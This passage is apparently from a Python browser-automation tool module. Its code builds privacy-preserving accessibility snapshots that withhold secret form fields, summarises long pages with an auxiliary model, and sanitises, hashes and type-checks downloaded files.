      for (let i = 0; i < labels.length; i++) {
        const label = labels[i];
        if (!label) continue;
        const text = (label.textContent || '')
          .trim().toLowerCase().slice(0, 200);
        if (text && SECRET_NAME_RE.test(text)) return true;
      }
    }
    return false;
  }
  function isMaskedByCss(el) {
    // -webkit-text-security turns an ordinary text input into a row of dots.
    // The page is hiding that content from the person in front of it, so it
    // is not ours to forward. An engine without the property reports
    // undefined, and getPropertyValue answers '' there rather than throwing.
    const style = window.getComputedStyle(el);
    if (!style) return false;
    const masking = typeof style.webkitTextSecurity === 'string'
      ? style.webkitTextSecurity
      : style.getPropertyValue('-webkit-text-security');
    return typeof masking === 'string' && masking !== '' && masking !== 'none';
  }
  // A disjunction, and never a chain of early returns: a channel may only add
  // secrecy, so no attribute a page happens to set can mask another.
  function isSecretField(el) {
    return isSecretAutocomplete(el) || isSecretName(el) || isMaskedByCss(el);
  }
"""


_A11Y_DOM_SNAPSHOT_JS = """
(serial) => {
  const TAG_TO_ROLE = {
    'a': 'link', 'button': 'button',
    'input': 'textbox', 'textarea': 'textbox',
    'select': 'combobox', 'option': 'option',
    'h1': 'heading', 'h2': 'heading', 'h3': 'heading',
    'h4': 'heading', 'h5': 'heading', 'h6': 'heading',
    'nav': 'navigation', 'main': 'main', 'header': 'banner',
    'footer': 'contentinfo', 'aside': 'complementary',
    'form': 'form', 'section': 'region',
    'ul': 'list', 'ol': 'list', 'li': 'listitem',
    'table': 'table', 'tr': 'row', 'td': 'cell', 'th': 'columnheader',
    'img': 'img',
  };
  function getRole(el) {
    const r = el.getAttribute('role');
    if (r) return r;
    const tag = el.tagName.toLowerCase();
    if (tag === 'input') {
      const t = (el.getAttribute('type') || 'text').toLowerCase();
      if (t === 'checkbox') return 'checkbox';
      if (t === 'radio') return 'radio';
      if (t === 'button' || t === 'submit' || t === 'reset') return 'button';
      if (t === 'search') return 'searchbox';
      return 'textbox';
    }
    return TAG_TO_ROLE[tag] || '';
  }
""" + _SECRET_FIELD_JS + """
  // Printing an input's value is opt-in, by type. The snapshot is assembled
  // into the agent's prompt and travels from there to a model provider, so a
  // type this list does not name — password, file, hidden, or whatever HTML
  // adds next — must read as a secret rather than as plain text. What stays
  // is the set whose content a form shows the person typing it anyway.
  const VALUE_INPUT_TYPES = new Set([
    'text', 'search', 'email', 'url', 'tel', 'number', 'range',
    'date', 'time', 'datetime-local', 'month', 'week', 'color',
  ]);
  // {value, withheld}: `withheld` says the field is filled without saying
  // with what, so the agent knows whether it still has to type there. Never
  // a length — that narrows the secret for free.
  function getValue(el) {
    const tag = el.tagName.toLowerCase();
    if (tag !== 'input' && tag !== 'textarea' && tag !== 'select') {
      return {value: '', withheld: false};
    }
    const raw = (el.value || '').toString();
    // Asked once, ahead of every per-tag branch: a card number lands in a
    // select as readily as in an input, and a one-time code in a textarea.
    if (isSecretField(el)) {
      return {value: '', withheld: raw.length > 0};
    }
    if (tag === 'input') {
      const t = (el.getAttribute('type') || 'text').toLowerCase();
      if (!VALUE_INPUT_TYPES.has(t)) {
        return {value: '', withheld: raw.length > 0};
      }
    }
    return {value: raw.slice(0, 200), withheld: false};
  }
  function isHidden(el) {
    if (el.getAttribute('aria-hidden') === 'true') return true;
    if (el.hidden) return true;
    const style = window.getComputedStyle(el);
    if (!style) return false;
    if (style.display === 'none') return true;
    if (style.visibility === 'hidden') return true;
    return false;
  }
  let nodeCount = 0;
  const MAX_NODES = 3000;
  // Stamp every visited element with an identity the Python side can turn
  // back into an exact locator. Without it a ref is only (role, name), and
  // that pair addresses nothing on a real page: an icon button has no name
  // at all, and a name that does exist is rarely unique.
  // Scoped by `serial` so marks left by earlier snapshots — on elements this
  // walk no longer reaches — cannot be mistaken for current ones.
  function walk(el) {
    if (!el || el.nodeType !== 1) return null;
    if (nodeCount >= MAX_NODES) return null;
    if (isHidden(el)) return null;
    const elId = serial + ':' + nodeCount;
    try { el.setAttribute('data-dpc-el', elId); } catch (e) { /* read-only DOM */ }
    nodeCount += 1;
    const role = getRole(el);
    const name = getName(el);
    const valueInfo = getValue(el);
    // A select is the one control whose secret sits in its children rather
    // than in its value: an option is a node of its own, named by its text,
    // and on a card picker that text is the last four digits. Withholding
    // the value while printing the list withholds nothing.
    // Decided on the predicate and not on whether something is selected: an
    // untouched card picker lists the same cards. What survives is a count,
    // so the agent still knows there is a choice here. Ordinary selects keep
    // their options — the snapshot mirrors the screen.
    const optionsWithheld =
      el.tagName.toLowerCase() === 'select' && isSecretField(el);
    const children = [];
    // Counted with a descendant query, since <optgroup> puts a level between.
    const optionCount = optionsWithheld
      ? el.querySelectorAll('option').length : 0;
    if (!optionsWithheld) {
      for (const child of el.children) {
        const sub = walk(child);
        if (sub) children.push(sub);
      }
      if (el.shadowRoot) {
        for (const child of el.shadowRoot.children) {
          const sub = walk(child);
          if (sub) children.push(sub);
        }
      }
    }
    if (!role && !name && children.length === 0) {
      let directText = '';
      for (const node of el.childNodes) {
        if (node.nodeType === 3) {
          const t = node.textContent.trim();
          if (t) directText += (directText ? ' ' : '') + t;
        }
      }
      if (directText) return {role: 'generic', name: directText.slice(0, 200), value: '', withheld: false, hidden: false, children: [], el: elId};
      return null;
    }
    return {
      role: role || 'generic',
      name: name,
      value: valueInfo.value,
      withheld: valueInfo.withheld,
      optionsWithheld: optionsWithheld,
      optionCount: optionCount,
      hidden: false,
      children: children,
      el: elId,
    };
  }
  return walk(document.body) || {role: 'generic', name: '', children: [], el: ''};
}
"""


_SELECT_PROBE_JS = "(el) => {\n" + _SECRET_FIELD_JS + """
  const tag = el.tagName.toLowerCase();
  if (tag !== 'select') {
    return {tag: tag, type: (el.getAttribute('type') || '').toLowerCase()};
  }
  const secret = isSecretField(el);
  // Counted with a descendant query, since <optgroup> puts a level between —
  // the same list the snapshot counts for `(N options)`, so an index read off
  // one addresses the same option in the other.
  const all = el.querySelectorAll('option');
  const options = [];
  // A withheld select's options do not leave the page at all: the walk
  // collects none either, and what is never read cannot be printed by
  // mistake further down.
  if (!secret) {
    for (let i = 0; i < all.length; i++) {
      const group = all[i].parentElement;
      const inDisabledGroup = !!(
        group && group.tagName === 'OPTGROUP' && group.disabled
      );
      options.push({
        index: i,
        value: all[i].value,
        label: (all[i].label || all[i].textContent || '').trim().slice(0, 200),
        disabled: !!all[i].disabled || inDisabledGroup,
      });
    }
  }
  return {
    tag: tag, secret: secret, multiple: !!el.multiple,
    disabled: !!el.disabled, optionCount: all.length, options: options,
  };
}
"""


_SELECT_CHOSEN_JS = "(el) => {\n" + _SECRET_FIELD_JS + """
  if (isSecretField(el)) return {secret: true};
  const opt = el.selectedOptions && el.selectedOptions[0];
  return {
    secret: false,
    value: opt ? opt.value : el.value,
    label: opt ? (opt.label || opt.textContent || '').trim().slice(0, 200) : '',
  };
}
"""


_SCROLL_VIEWPORT_JS = """
(delta) => {
  const x = window.innerWidth / 2;
  const y = window.innerHeight / 2;
  let el = document.elementFromPoint(x, y);
  let scroller = null;
  while (el && el !== document.body) {
    const s = window.getComputedStyle(el);
    const overflowY = s.overflowY;
    if ((overflowY === 'auto' || overflowY === 'scroll' || overflowY === 'overlay')
        && el.scrollHeight > el.clientHeight) {
      scroller = el;
      break;
    }
    el = el.parentElement;
  }
  if (!scroller) {
    scroller = document.scrollingElement || document.documentElement;
  }
  const before = scroller.scrollTop;
  scroller.scrollBy({top: delta, behavior: 'instant'});
  const after = scroller.scrollTop;
  const tag = scroller.tagName.toLowerCase();
  const idPart = scroller.id ? ('#' + scroller.id) : '';
  const clsPart = scroller.className && typeof scroller.className === 'string'
    ? ('.' + scroller.className.trim().split(/\\s+/).slice(0, 2).join('.'))
    : '';
  const rect = scroller.getBoundingClientRect();
  return {
    scrolled: after - before,
    target: tag + idPart + clsPart,
    centerX: Math.round(rect.left + rect.width / 2),
    centerY: Math.round(rect.top + rect.height / 2),
  };
}
"""


_DETECT_SCROLLABLE_CONTAINERS_JS = """
() => {
  const results = [];
  const all = document.querySelectorAll('*');
  for (const el of all) {
    const s = window.getComputedStyle(el);
    const ov = s.overflowY;
    if ((ov === 'auto' || ov === 'scroll' || ov === 'overlay')
        && el.scrollHeight > el.clientHeight + 20) {
      const tag = el.tagName.toLowerCase();
      const id = el.id ? ('#' + el.id) : '';
      const cls = el.className && typeof el.className === 'string'
        ? ('.' + el.className.trim().split(/\\s+/).filter(Boolean).slice(0, 3).join('.'))
        : '';
      const selector = tag + id + cls;
      const children = el.children;
      let childTag = '', childCls = '';
      if (children.length > 0) {
        const fc = children[0];
        childTag = fc.tagName.toLowerCase();
        const fcCls = fc.className && typeof fc.className === 'string'
          ? ('.' + fc.className.trim().split(/\\s+/).filter(Boolean).slice(0, 2).join('.'))
          : '';
        childCls = childTag + fcCls;
      }
      results.push({
        container: selector,
        itemCount: children.length,
        itemSelector: childCls,
        scrollHeight: el.scrollHeight,
        clientHeight: el.clientHeight,
      });
    }
  }
  return results;
}
"""


_A11Y_INTERACTIVE_ROLES: frozenset[str] = frozenset({
    "button", "link", "textbox", "checkbox", "combobox",
    "menuitem", "tab", "searchbox",
    "heading", "radio", "slider", "spinbutton", "switch",
    "option", "treeitem",
})
_A11Y_VALUE_ROLES: frozenset[str] = frozenset({
    "textbox", "searchbox", "combobox", "spinbutton", "slider",
})
_A11Y_SKIP_WRAPPER_ROLES: frozenset[str] = frozenset({
    "generic", "presentation", "none",
})
# Stands where the value would, for a field the walk refused to read. The
# agent needs "filled, not yours to see" — without it a password field with
# a password in it is indistinguishable from an empty one.
_A11Y_WITHHELD_VALUE = "[withheld]"


def _a11y_option_count(count: int) -> str:
    """Stands where a withheld select's options would. The agent needs
    "there is a list here and it is not yours to read" — a bare
    `[withheld]` combobox reads as a field to type into."""
    return f"({count} option{'' if count == 1 else 's'})"


def _build_a11y_tree(root: dict) -> tuple[str, dict]:
    """Render `root` (Playwright accessibility snapshot) as
    (tree_text, refs_map). Hidden + aria-hidden nodes are dropped;
    nameless wrapper roles (`generic`/`presentation`/`none`) collapse
    into their children to keep the tree readable for the agent."""
    refs: dict[str, dict] = {}
    counter = [0]
    lines: list[str] = []

    def walk(node: dict, depth: int) -> None:
        if not node or node.get("hidden"):
            return
        role = node.get("role", "")
        name = node.get("name", "")
        children = node.get("children", []) or []
        if role in _A11Y_SKIP_WRAPPER_ROLES and not name:
            for child in children:
                walk(child, depth)
            return
        ref_tag = ""
        if role in _A11Y_INTERACTIVE_ROLES:
            counter[0] += 1
            ref = f"@e{counter[0]}"
            refs[ref] = {"role": role, "name": name, "el": node.get("el", "")}
            ref_tag = f" [{ref}]"
        indent = "  " * depth
        line = f"{indent}- {role}"
        if name:
            line += f' "{name}"'
        value = node.get("value", "")
        if role in _A11Y_VALUE_ROLES:
            # The marker is asked for first, so that a node carrying both
            # cannot print the value: otherwise the rule that one excludes
            # the other would hold in the JS alone, and every later producer
            # of these dicts would have to be trusted to keep it.
            if node.get("withheld"):
                line += f" = {_A11Y_WITHHELD_VALUE}"
            elif value:
                line += f' = "{value}"'
        options_withheld = bool(node.get("optionsWithheld"))
        if options_withheld:
            line += f" {_a11y_option_count(int(node.get('optionCount') or 0))}"
        line += ref_tag
        lines.append(line)
        if options_withheld:
            # Read before the children, for the same reason the marker is
            # read before the value: a node that says its options are secret
            # must not print them, whoever handed them over.
            return
        for child in children:
            walk(child, depth + 1)

    walk(root, 0)
    return "\n".join(lines), refs


SNAPSHOT_SUMMARIZE_THRESHOLD = 8000

# The auxiliary summarizer must finish well inside the calling tool's own
# budget (browser_snapshot gets 60s). An unbounded call once ran for 10
# minutes on a video page: the tool timed out at 60s, the agent got
# nothing, retried until the loop guard killed the run — and the
# abandoned request went on billing tokens after the turn had ended.
SNAPSHOT_SUMMARIZE_TIMEOUT_SEC = 25

HTTP_ERROR_PREFIX = "⚠️ HTTP "


def _truncate_snapshot(
    snapshot_text: str, max_chars: int = SNAPSHOT_SUMMARIZE_THRESHOLD,
) -> str:
    """Phase 1 summarization: cut a snapshot at line boundaries so
    accessibility-tree entries are never split mid-line, then append a
    short marker telling the agent how many lines were dropped. No-op
    when `snapshot_text` already fits under `max_chars`."""
    if len(snapshot_text) <= max_chars:
        return snapshot_text
    lines = snapshot_text.split("\n")
    result: list[str] = []
    chars = 0
    reserve = 80
    for line in lines:
        if chars + len(line) + 1 > max_chars - reserve:
            break
        result.append(line)
        chars += len(line) + 1
    remaining = len(lines) - len(result)
    if remaining > 0:
        # The old marker read "use browser_snapshot for full content" and was
        # printed from inside browser_snapshot, so the advice pointed at the
        # call that had just truncated. The handle that actually returns the
        # whole tree is the raw flag.
        result.append(
            f"\n[... {remaining} of {len(lines)} lines truncated at"
            f" {max_chars} chars | full tree: browser_snapshot(raw=True)]"
        )
    return "\n".join(result)


def _audit_error(exc: BaseException) -> dict:
    """Audit fields for a failed browser action.

    The type alone does not identify the failure: `Error` covered both a
    strict-mode violation naming 24 matching buttons and unrelated
    Playwright refusals, and the record kept neither message. Reading the
    audit afterwards could establish that something failed and nothing
    about why. First line only — Playwright appends a call log that runs
    to dozens of lines.
    """
    message = str(exc).strip().split("\n", 1)[0]
    return {"error": type(exc).__name__, "error_message": message[:300]}


_REF_LINE_RE = re.compile(r"\[@e\d+\]")


def _split_actionable_lines(snapshot_text: str) -> tuple[list[str], str]:
    """Separate the lines that carry a `@eN` ref from everything else.

    A ref is the only thing on the page the agent can actually address.
    Handing the whole tree to a summarizing model and asking it to be
    concise loses them wholesale: a calendar of 31 day cells came back as
    the single line "Calendar showing August 2026 (day grid 1-31)", after
    which the agent had nothing to click and spent minutes guessing CSS
    selectors that timed out one by one.

    So the refs never reach the model. Only the prose around them does.
    """
    actionable: list[str] = []
    prose: list[str] = []
    for line in snapshot_text.split("\n"):
        (actionable if _REF_LINE_RE.search(line) else prose).append(line)
    return actionable, "\n".join(prose)


def _summary_notice(tree_chars: int, summary_chars: int, provider: str | None) -> str:
    """Say that what follows is a rewrite, not the page.

    The LLM path returned the auxiliary model's prose with no marker of any
    kind, so an agent could not tell a summarised snapshot from a real one:
    the only silent substitution in the tool set, and the one that is not
    about length at all. Everything the caller needs to judge it — that a
    model rewrote it, which model, how much was compressed, and the handle
    that returns the tree itself — belongs in front of the text.
    """
    return (
        f"[snapshot summarised by {provider or 'the configured summariser'}:"
        f" {tree_chars} chars of accessibility tree rewritten as"
        f" {summary_chars} chars of prose — this is a summary, not the tree."
        f" Interactive elements below are verbatim."
        f" Full tree: browser_snapshot(raw=True)]\n\n"
    )


def _rejoin_with_actionable(summary: str, actionable: list[str]) -> str:
    """Put the untouched ref lines back after the summarized prose.

    The result can exceed the threshold the summarization was asked to
    meet. That is deliberate: a snapshot under budget that the agent
    cannot act on is worse than one over it.
    """
    if not actionable:
        return summary
    block = "\n".join(actionable)
    if not summary:
        return block
    return f"{summary}\n\nInteractive elements (verbatim, refs intact):\n{block}"


_LLM_EXTRACT_WITH_TASK = (
    "You are a content extractor for a browser automation agent.\n\n"
    "The user's task is: {user_task}\n\n"
    "Given the following page snapshot (accessibility tree representation), "
    "extract and summarize the most relevant information for completing "
    "this task. Focus on:\n"
    "1. Text content relevant to the task "
    "(prices, descriptions, headings, important info)\n"
    "2. Navigation structure if relevant\n\n"
    "The interactive elements have already been separated out and will be "
    "appended to your answer verbatim. They are not in the text below — do "
    "not try to reproduce or refer to them.\n\n"
    "Page Snapshot (surrounding content only):\n{snapshot}\n\n"
    "Provide a concise summary of this content."
)

_LLM_EXTRACT_NO_TASK = (
    "Summarize this page snapshot, preserving:\n"
    "1. Key text content and headings\n"
    "2. Important information visible on the page\n\n"
    "The interactive elements have already been separated out and will be "
    "appended to your answer verbatim. They are not in the text below — do "
    "not try to reproduce or refer to them.\n\n"
    "Page Snapshot (surrounding content only):\n{snapshot}\n\n"
    "Provide a concise summary of this content."
)


async def _llm_summarize_snapshot(
    snapshot_text: str,
    user_task: str | None,
    llm_manager: Any,
    provider_alias: str | None = None,
    max_chars: int = SNAPSHOT_SUMMARIZE_THRESHOLD,
) -> str:
    """Phase 2 summarization: route an oversized snapshot + the agent's
    current task through the LLM Manager (same path Sleep Consolidation
    uses) so an auxiliary model can extract just the task-relevant
    elements. Falls back to `_truncate_snapshot` when llm_manager is
    None, when the auxiliary call raises or outruns
    `SNAPSHOT_SUMMARIZE_TIMEOUT_SEC`, or when the model returns an
    empty string. No-op when `snapshot_text` already fits under
    `max_chars`."""
    if len(snapshot_text) <= max_chars:
        return snapshot_text
    actionable, prose = _split_actionable_lines(snapshot_text)
    if llm_manager is None:
        return _rejoin_with_actionable(
            _truncate_snapshot(prose, max_chars), actionable,
        )
    if user_task:
        prompt = _LLM_EXTRACT_WITH_TASK.format(
            user_task=user_task, snapshot=prose,
        )
    else:
        prompt = _LLM_EXTRACT_NO_TASK.format(snapshot=prose)
    try:
        response = await asyncio.wait_for(
            llm_manager.query(prompt, provider_alias=provider_alias),
            timeout=SNAPSHOT_SUMMARIZE_TIMEOUT_SEC,
        )
        extracted = (response or "").strip()
        if extracted:
            return _rejoin_with_actionable(
                _summary_notice(len(snapshot_text), len(extracted), provider_alias)
                + extracted,
                actionable,
            )
        return _rejoin_with_actionable(
            _truncate_snapshot(prose, max_chars), actionable,
        )
    except asyncio.TimeoutError:
        log.warning(
            "snapshot summarization exceeded %ss, falling back to truncation",
            SNAPSHOT_SUMMARIZE_TIMEOUT_SEC,
        )
        return _rejoin_with_actionable(
            _truncate_snapshot(prose, max_chars), actionable,
        )
    except Exception:
        return _truncate_snapshot(snapshot_text, max_chars)


class _PinnedThread:
    """One daemon thread that runs every call belonging to one browser session.

    Deliberately not a `ThreadPoolExecutor`, though it wears the same `submit`
    so `loop.run_in_executor` accepts it. A pool worker parked on a dead
    Playwright IPC keeps the whole process alive after everything else has
    stopped: `ThreadPoolExecutor._adjust_thread_count` registers every worker in
    `concurrent.futures.thread._threads_queues`, and `_python_exit` joins each
    thread in that map - through `threading._register_atexit`, so it runs before
    the interpreter joins non-daemon threads (CPython 3.12, `thread.py:205`
    and `:23-31`). The daemon flag cannot help against an explicit join.

    Observed 2026-08-12 17:32: a shutdown left the process alive with
    `camoufox-agent_001_0` inside `AuthBrowser.close()` ->
    `_dispatcher_fiber.switch()`, minutes after the service logged itself down
    and one second after its own 5 s timeout had force-killed the browser
    subprocess. Killing the child does not unpark the fiber.

    A raw daemon thread is in no such map and is not waited for, so the same
    parked call costs a leaked thread in a process that is exiting anyway.
    """

    def __init__(self, name: str):
        self._queue: "queue.Queue[Optional[tuple]]" = queue.Queue()
        self._thread = threading.Thread(target=self._run, name=name, daemon=True)
        self._thread.start()

    def _run(self) -> None:
        while True:
            item = self._queue.get()
            if item is None:
                return
            fn, args, kwargs, future = item
            if not future.set_running_or_notify_cancel():
                continue  # the caller's wait_for timed out and cancelled it
            try:
                future.set_result(fn(*args, **kwargs))
            except BaseException as exc:  # noqa: BLE001 - mirrors executor semantics
                future.set_exception(exc)

    def submit(self, fn, *args: Any, **kwargs: Any) -> Future:
        future: Future = Future()
        self._queue.put((fn, args, kwargs, future))
        return future

    def shutdown(self) -> None:
        """Ask the thread to stop after whatever it is currently running.

        Never waits: the reason this class exists is that the current call may
        never return.
        """
        self._queue.put(None)


# ─────────────────────────────────────────────────────────────
# Downloads — the name, the size, the family, the ledger
# ─────────────────────────────────────────────────────────────

# Generous on purpose: the tool exists to fetch what a person asked for, and
# a scanned book is an ordinary one. Playwright hands over no size before the
# save, so this is enforced on the saved bytes.
DOWNLOAD_MAX_BYTES = 512 * 1024 * 1024

# How long the click may wait for a download to START, and the ceiling the
# tool clamps `timeout_seconds` to. Three minutes because a real site led
# through two navigations and a host probe before the transfer began, and a
# minute of that was a network outage on our own side (Mike's call). Five
# minutes as the bound: a site that has begun nothing by then is not slow,
# and every waiting second is one the agent's round is holding.
_DOWNLOAD_TIMEOUT_DEFAULT = 180
_DOWNLOAD_TIMEOUT_MAX = 300

# The transfer the START timeout must not eat. Measured 1.2 MB/s on the live
# run of 2026-09-21; assumed here as the floor a saved file moves at, so the
# allowance follows the cap rather than a number somebody has to remember to
# raise with it.
_DOWNLOAD_RATE_BYTES_PER_SEC = 1_200_000
_DOWNLOAD_SAVE_TIMEOUT_SEC = -(-DOWNLOAD_MAX_BYTES // _DOWNLOAD_RATE_BYTES_PER_SEC)

# Whichever timeout fires first decides what the agent reads: the session
# call's own gives it a sentence naming the page, the ToolEntry ceiling gives
# it `TOOL_TIMEOUT` and a number. So the ceiling sits above the longest
# session wait this tool can ask for, by a margin the clock cannot close.
_DOWNLOAD_CEILING_MARGIN_SEC = 30
_DOWNLOAD_TOOL_TIMEOUT_SEC = (
    _DOWNLOAD_TIMEOUT_MAX + _DOWNLOAD_SAVE_TIMEOUT_SEC + _DOWNLOAD_CEILING_MARGIN_SEC
)

# Room for a title and an extension, with the dedup suffix and the sandbox
# path still inside the 255-byte limit filesystems here enforce.
_DOWNLOAD_NAME_MAX = 120
_DOWNLOAD_EXT_MAX = 16
_DOWNLOAD_NAME_ATTEMPTS = 1000

# Windows refuses these whatever the extension, and a file saved on Linux is
# one sync away from a Windows disk — so the rule runs on every OS.
_WINDOWS_DEVICE_NAMES = frozenset(
    {"CON", "PRN", "AUX", "NUL"}
    | {f"COM{i}" for i in range(1, 10)}
    | {f"LPT{i}" for i in range(1, 10)}
)

DOWNLOAD_LEDGER_NAME = "downloads.jsonl"

# Enough to reach every signature below past a BOM and some whitespace.
_DOWNLOAD_SNIFF_BYTES = 64

_DOWNLOAD_SHOWN_LIMIT = 200

# When a click starts nothing, what the page itself offers. Live on
# 2026-09-21 the file sat behind "if the download did not start, use this
# link", on the file host rather than the page's — a fact the answer did not
# carry because it looked only at the address bar.
_NO_DOWNLOAD_LINKS_MAX = 5
_NO_DOWNLOAD_LINK_TEXT_LIMIT = 60

_CROSS_HOST_LINKS_JS = """
(max) => {
  const here = location.host;
  const mine = location.href;
  const mineEncoded = encodeURIComponent(mine);
  const seen = new Set();
  const out = [];
  for (const a of document.querySelectorAll('a[href]')) {
    let href = '';
    try { href = a.href || ''; } catch (e) { continue; }
    if (!/^https?:/i.test(href)) continue;
    let host = '';
    try { host = new URL(href).host; } catch (e) { continue; }
    if (!host || host === here || seen.has(href)) continue;
    // A link to another host that carries this page's own address is a
    // share button by definition, and a row of them is what a page puts
    // above the link worth having.
    if (href.includes(mine) || href.includes(mineEncoded)) continue;
    seen.add(href);
    let text = (a.textContent || '').trim().replace(/\\s+/g, ' ');
    if (!text) text = (a.getAttribute('aria-label') || '').trim();
    if (!text) text = (a.getAttribute('title') || '').trim();
    if (!text) {
      const img = a.querySelector('img[alt]');
      if (img) text = (img.getAttribute('alt') || '').trim();
    }
    out.push({href: href, text: text});
  }
  // Named first, then the cap: a link nobody can read is worth a slot only
  // when no named one wants it.
  return out.filter(l => l.text).concat(out.filter(l => !l.text)).slice(0, max);
}
"""


# What a click that never reached the page is asked afterwards. Short,
# because the click has already spent its whole wait — and each probe acts
# as well as asks, so a "passed" means the page may have moved.
_CLICK_PROBE_TIMEOUT_MS = 5000
# How long a probe that acted waits for the file it may have started: a
# download nobody waits for dies with the context.
_CLICK_PROBE_DOWNLOAD_MS = 5000

# Set on the exception a failed click raises: present when the click itself
# is what failed, and carrying the probe lines when it timed out.
_CLICK_DIAGNOSIS_ATTR = "_dpc_click_diagnosis"

# Returns a word rather than undefined: what the probe answered is how
# `_click_probes` knows it ran at all when the wait after it times out.
_JS_CLICK = "el => { el.click(); return 'clicked'; }"

# A window Windows is not painting — minimised, or moved off screen —
# delivers requestAnimationFrame about once a second instead of sixty times,
# and `document.visibilityState` still says "visible", so the page cannot
# tell. Playwright's actionability poll rides on rAF, so `click()` waits out
# its whole timeout without one DOM event reaching the page. Counting the
# callbacks is the only reading that separates that from a page that is
# merely slow.
_RAF_SAMPLE_MS = 250
_RAF_STARVED_BELOW = 10

_CLICK_FACTS_JS = """
(el, sample) => new Promise(resolve => {
  let frames = 0;
  let done = false;
  const tick = () => { frames++; if (!done) requestAnimationFrame(tick); };
  requestAnimationFrame(tick);
  setTimeout(() => {
    done = true;
    resolve({
      tag: el.tagName.toLowerCase(),
      ready: document.readyState,
      raf: frames,
    });
  }, sample);
})
"""

_CLICK_DELIVERY_MOUSE = "mouse"
_CLICK_DELIVERY_EVENT = "dom_event"

_WINDOW_NOT_PAINTED = (
    "The browser window is not being painted — it is minimised or "
    "off-screen. Restore it on screen; clicks are then delivered normally."
)

_UNCLAIMED_DIR_NAME = "unclaimed"
_UNCLAIMED_NOTE = "unclaimed: no tool call was waiting for this download"


def _window_is_starved(facts: dict) -> bool:
    """True when the frame count says the window is not being painted. A
    reading that never arrived decides nothing: the ordinary click stands."""
    raf = (facts or {}).get("raf")
    return isinstance(raf, (int, float)) and raf < _RAF_STARVED_BELOW


def _is_timeout(exc: BaseException) -> bool:
    """Playwright's TimeoutError, by name: the package is an optional extra
    and this module imports none of it."""
    return any(cls.__name__ == "TimeoutError" for cls in type(exc).__mro__)


def _unclaimed_download_dir(agent_id: str) -> Path:
    """Where a download nobody claimed lands, beside the ones a tool call
    asked for."""
    from ..utils import get_agent_root

    return get_agent_root(agent_id) / _DOWNLOAD_DIR_DEFAULT / _UNCLAIMED_DIR_NAME


def _one_line(text: str, limit: int = _DOWNLOAD_SHOWN_LIMIT) -> str:
    """One bounded line. What a site called a file is the site's own text and
    it travels into the agent's transcript, so it arrives flattened."""
    flat = " ".join(str(text).split())
    return flat if len(flat) <= limit else flat[: limit - 1] + "…"


def _safe_download_name(suggested: Optional[str]) -> str:
    """The name a file is saved under, built from the one the site chose.

    `Content-Disposition` is a field the other side writes, and it has
    carried `../`, a drive letter, a NUL and `CON.txt`. Everything that could
    decide a path or name a device is removed here, in one place, so a caller
    only ever joins a plain name onto a directory it resolved itself.
    """
    name = re.split(r"[\\/]", str(suggested or ""))[-1]
    name = re.sub(r"^[A-Za-z]:", "", name)
    name = re.sub(r"[\x00-\x1f\x7f]", "", name)
    name = re.sub(r'[<>:"|?*]', "_", name)
    # Windows drops trailing dots and spaces, so two names differing only in
    # them are one file there.
    name = name.strip().rstrip(". ")
    # `.` and `..` are not names; a dot-led name is also a file nobody sees.
    name = name.lstrip(".")
    if not name:
        return "download"

    stem, dot, ext = name.rpartition(".")
    if not dot or len(ext) > _DOWNLOAD_EXT_MAX:
        stem, ext = name, ""
    if stem.upper() in _WINDOWS_DEVICE_NAMES:
        stem = f"_{stem}"
    suffix = f".{ext}" if ext else ""
    if len(stem) + len(suffix) > _DOWNLOAD_NAME_MAX:
        stem = stem[: max(1, _DOWNLOAD_NAME_MAX - len(suffix))]
    return f"{stem}{suffix}" or "download"


def _unique_download_path(directory: Path, name: str) -> Path:
    """Claim a free name beside the files already there; never overwrite.

    Claimed by creating the file exclusively rather than by asking whether it
    exists: two downloads of one page a moment apart would both find
    `book.pdf` free.
    """
    stem, dot, ext = name.rpartition(".")
    if not dot:
        stem, ext = name, ""
    suffix = f".{ext}" if ext else ""
    for n in range(_DOWNLOAD_NAME_ATTEMPTS):
        candidate = directory / (name if n == 0 else f"{stem}-{n}{suffix}")
        try:
            fd = os.open(candidate, os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
        except FileExistsError:
            continue
        os.close(fd)
        return candidate
    raise OSError(
        f"{_DOWNLOAD_NAME_ATTEMPTS} files in {directory.name} are already "
        f"named like {name!r}"
    )


def _file_sha256(path: Path) -> str:
    """SHA-256 a megabyte at a time — a book is not read into memory to be
    hashed."""
    digest = hashlib.sha256()
    with open(path, "rb") as fh:
        for block in iter(lambda: fh.read(1024 * 1024), b""):
            digest.update(block)
    return digest.hexdigest()


# What a file IS, from its first bytes. A site can answer a download click
# with a login page or an HTML error and call it `book.pdf`, so the extension
# is the site's claim and this is the check.
_FILE_SIGNATURES: Tuple[Tuple[bytes, str], ...] = (
    (b"%PDF", "pdf"),
    (b"AT&T", "djvu"),
    (b"PK\x03\x04", "zip container"),
    (b"Rar!", "rar"),
    (b"7z\xbc\xaf\x27\x1c", "7z"),
    (b"\x1f\x8b", "gzip"),
    (b"\xd0\xcf\x11\xe0", "ole"),
)

_BYTE_ORDER_MARKS = (b"\xef\xbb\xbf", b"\xff\xfe", b"\xfe\xff")


def _sniff_file_type(head: bytes) -> str:
    """The family the first bytes name, never the one the extension claims."""
    for magic, family in _FILE_SIGNATURES:
        if head.startswith(magic):
            return family
    text = bytes(head)
    for bom in _BYTE_ORDER_MARKS:
        if text.startswith(bom):
            text = text[len(bom):]
            break
    text = text.lstrip(b" \t\r\n")
    if text.startswith(b"<"):
        lowered = text.lower()
        if lowered.startswith(b"<!doctype html") or lowered.startswith(b"<html"):
            return "html"
        return "markup"
    return "unknown"


# The extensions each family is an honest answer for. A family with no row is
# a pair nobody has weighed, and stays silent rather than crying mismatch.
_TYPE_EXTENSIONS: Dict[str, frozenset] = {
    "pdf": frozenset({"pdf"}),
    "djvu": frozenset({"djvu", "djv"}),
    "zip container": frozenset({
        "zip", "epub", "docx", "xlsx", "pptx", "odt", "ods", "odp",
        "cbz", "fb2", "jar", "apk",
    }),
    "rar": frozenset({"rar", "cbr"}),
    "7z": frozenset({"7z"}),
    "gzip": frozenset({"gz", "tgz", "tar", "fb2", "svgz"}),
    "ole": frozenset({"doc", "xls", "ppt", "msi", "msg"}),
    "html": frozenset({"html", "htm", "xhtml"}),
    "markup": frozenset({"html", "htm", "xhtml", "xml", "svg", "fb2", "opf"}),
}


def _type_contradicts_extension(detected: str, name: str) -> bool:
    """True when the bytes and the name disagree about what this file is."""
    ext = name.rpartition(".")[2].lower() if "." in name else ""
    allowed = _TYPE_EXTENSIONS.get(detected)
    if not ext or allowed is None:
        return False
    return ext not in allowed


# ─────────────────────────────────────────────────────────────
# Selecting one option of a native <select>
# ─────────────────────────────────────────────────────────────

